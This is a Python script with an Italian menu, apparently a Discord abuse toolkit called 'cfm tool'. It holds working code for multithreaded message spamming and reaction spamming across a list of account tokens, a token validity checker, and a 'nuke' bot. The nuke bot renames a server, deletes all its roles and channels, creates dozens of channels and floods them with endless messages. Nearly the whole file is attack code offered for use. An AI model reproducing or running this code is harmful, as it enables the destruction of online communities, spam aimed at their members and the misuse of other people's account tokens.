import os
import discord
from discord.ext import commands
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System, Box
import concurrent.futures
import random
import string
import tls_client
from colorama import Fore, Style
import dtypes
import keyboard
import sys
import time
import threading
import json
import requests
import ctypes
import datetime

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX


def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

nome = input("Username >>> ")




print("Login come " + nome)

Write.Print(f"""
\t██████████ ██████████ ████      ████    ██████████████ ████████████ ████████████ ██
\t██         ██         ██  ██  ██  ██          ██       ██        ██ ██        ██ ██
\t██         ██         ██    ██    ██          ██       ██        ██ ██        ██ ██
\t██         ██████     ██          ██          ██       ██        ██ ██        ██ ██
\t██         ██         ██          ██          ██       ██        ██ ██        ██ ██
\t██         ██         ██          ██          ██       ██        ██ ██        ██ ██
\t██████████ ██         ██          ██          ██       ████████████ ████████████ ██████████
""", Colors.green_to_blue, interval=0.0010)

Write.Print(f"""
Versione -> [1.0.0]
Help -> discord.gg/KBt5dVfBxc
Piano -> Free
""", Colors.green_to_yellow, interval=0.0100)


Write.Print(f"""
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════ """, Colors.green_to_blue, interval=0.0100)
Write.Print(f"""
DESCRIZIONE                     | developer      | versione      | stato
                    
[1]token joiner                 | 3rback         | premium       | [on]
[2]token spammer                | tammi_s0       | free          | [on]
[3]token spammer                | tammi_s0       | premium       | [on]           
[4]token reazioni spammer       | tammi_s0       | free          | [on]
[5]token checker                | tammi_s0       | free          | [on]
[6]token generatore             | tammi_s0       | premium       | [off]
[7]bot nuke                     | tammi_s0       | free          | [on]
""", Colors.green_to_yellow, interval=0.0100)
Write.Print(f"""
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════ """, Colors.green_to_blue, interval=0.0100)

scelta = input("\n>>> ")

if scelta == "1":
    print("devi avere la versione premium!!", red)
    input("premi un qualsiasi tasto per uscire")




elif scelta == "2":
    global msg_sent_2, msg_failed_2, msg_ratelimited_2
    msg_sent_2 = 0
    msg_failed_2 = 0
    msg_ratelimited_2 = 0

    channel_id = input("Inserisci l'ID del canale: ")
    message_content = input("Inserisci il contenuto del messaggio: ") + " |cfm.tool.free"
    repeat_count = int(input("Quante volte vuoi inviare il messaggio?: "))

    with open("data/tokens.txt", "r") as file:
        tokens = file.read().splitlines()

    def spammer_2(token):
        global msg_sent_2, msg_failed_2, msg_ratelimited_2  # Dichiarazione delle variabili non locali

        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        headers = {'Authorization': token}
        payload = {'content': f'{message_content}'}

        for _ in range(repeat_count):
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                print("Messaggio inviato con successo con il token:", token)
                msg_sent_2 += 1
            elif response.status_code == 401:
                print("Token non valido:", token)
                msg_failed_2 += 1
            elif response.status_code == 429:
                print("Limite di velocità raggiunto con il token:", token)
                msg_ratelimited_2 += 1
            elif response.status_code == 403:
                print("Token non valido o bannato:", token)
                msg_failed_2 += 1
            else:
                print("Errore sconosciuto con il token:", token)

    threads = []
    for token in tokens:
        thread = threading.Thread(target=spammer_2, args=(token,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("Invio completato.")
    print("Messaggi inviati con successo:", msg_sent_2)
    print("Messaggi non inviati:", msg_failed_2)
    print("Messaggi non inviati per limite di velocità:", msg_ratelimited_2)



elif scelta == "3":
    print("devi avere la versione premium!!", red)
    input("premi un qualsiasi tasto per uscire") 



elif scelta == "4":
    
    def read_tokens():
        with open("data/tokens.txt", "r") as file:
            return file.read().splitlines()

    def reactor(token, channel_id, message_id, emoji):
        headers = {'Authorization': token}
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me"
        response = requests.put(url, headers=headers)

        if response.status_code == 204:
            print(green + token[:-5] + "*****", yellow, "Successo")
        elif response.status_code == 401:
            print(red + token[:-5] + "*****", yellow, "ERRORE")
        elif response.status_code == 403:
            print(yellow + token[:-5] + "*****", yellow, "Bloccato")
        else:
            print(red + token[:-5] + "*****", yellow, "ERRORE")

    def main():
        tokens = read_tokens()

        channel_id = Write.Input("ID del canale: ", Colors.blue_to_green, interval=0.020)
        message_id = Write.Input("ID del messaggio: ", Colors.blue_to_green, interval=0.020)
        emoji = Write.Input("Emoji: ", Colors.blue_to_green, interval=0.020)

        threads = []
        for token in tokens:
            thread = threading.Thread(target=reactor, args=(token, channel_id, message_id, emoji))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    if __name__ == "__main__":
        main()

elif scelta == "5":

    def check_token(token):
        headers = {
            'Authorization': token
        }
        response = requests.get('https://discord.com/api/v9/users/@me/affinities/guilds', headers=headers)

        if response.status_code == 200:
            return f"{Fore.GREEN}[VALID] {token}"
        elif response.status_code == 401:
            return f"{Fore.RED}[INVALID] {token}"
        elif response.status_code == 403:
            return f"{Fore.YELLOW}[BLOCKED] {token}"
        else:
            return f"{Fore.RED}Errore sconosciuto: {token}"

    tokens_file = os.path.join('data', 'tokens.txt')

    with open(tokens_file, 'r') as file:
        tokens = file.readlines()
        if not tokens:
            print("Il file tokens.txt è vuoto.")
        else:
            for token in tokens:
                print(check_token(token.strip()))


elif scelta == "7":
    ctypes.windll.kernel32.SetConsoleTitleW('nuke by cfm tool')
    Write.Print(f'''
    \t██████████ ██████████ ████      ████      ████          ██  ██      ██  ██      ██  ██████████
    \t██         ██         ██  ██  ██  ██      ██  ██        ██  ██      ██  ██    ██    ██
    \t██         ██         ██    ██    ██      ██    ██      ██  ██      ██  ██  ██      ██
    \t██         ██████     ██          ██      ██      ██    ██  ██      ██  ████        ██████
    \t██         ██         ██          ██      ██        ██  ██  ██      ██  ██  ██      ██
    \t██         ██         ██          ██      ██          ████  ██      ██  ██    ██    ██
    \t██████████ ██         ██          ██      ██            ██  ██████████  ██      ██  ██████████
    ''', Colors.green_to_red, interval=0.000)
    Write.Print(f"\nbot_token -> ", Colors.green_to_red, interval=0.010); bot_token = input()
    Write.Print(f"messaggio da spammare -> ", Colors.green_to_red, interval=0.010); message = input()
    Write.Print(f"nomi dei nuovi canali  -> ", Colors.green_to_red, interval=0.010); channel_names = input()
    Write.Print(f"nomi dei nuovi ruoli -> ", Colors.green_to_red, interval=0.010); role_names = input()
    Write.Print(f"nuovo nome del server -> ", Colors.green_to_red, interval=0.010); server_name = input()


    def server_nuker():  
            prefix = "$"
            guild_name = f"{server_name}"
            bot = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
            bot.remove_command('help')

            @bot.event
            async def on_ready():
                System.Clear()
                Write.Print(f"""
                            
login nel bot : {bot.user}
esegui $cfm_nuke per iniziare\n\n""", Colors.green_to_red, interval=0.001)
                @bot.event
                async def on_guild_channel_create(channel):
                    while True:
                        await channel.send(message)
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Sent Message {gray}---> {pink}{message}")
                    
                @bot.event
                async def on_guild_join(guild):
                    for channel in guild.text_channels:
                        if channel.permissions_for(guild.me).create_instant_invite:
                            invite = await channel.create_invite()
                            break  

                @bot.command()
                async def cfm_nuke(ctx):
                    await ctx.message.delete()
                    await ctx.guild.edit(name=guild_name)
                    for role in ctx.guild.roles:
                        try:
                            await role.delete()
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}ruolo elliminato {gray}---> {pink}{role.name}")
                        except:
                            pass
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}ERRORE!! ruolo non elliminato {gray}---> {pink}{role.name}")
                        
                    for channel in ctx.guild.channels:
                        try:
                            await channel.delete()
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}canale elliminato {gray}---> {pink}#{channel.name}")
                        except:
                            pass
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}ERRORE!! canale non elliminato {gray}---> {pink}#{channel.name}")
                        
                    try:
                        for i in range(69):
                            await ctx.guild.create_text_channel(channel_names)
                            time_rn = get_time_rn()
                            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}canale creato {gray}---> {pink}#{channel_names}")
                    except Exception:
                        time_rn = get_time_rn()
                        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}ERRORE!! canale non creato {gray}---> {pink}#{channel_names}")
            try:
                bot.run(bot_token)
            except Exception as e:
                return
                
    server_nuker()   



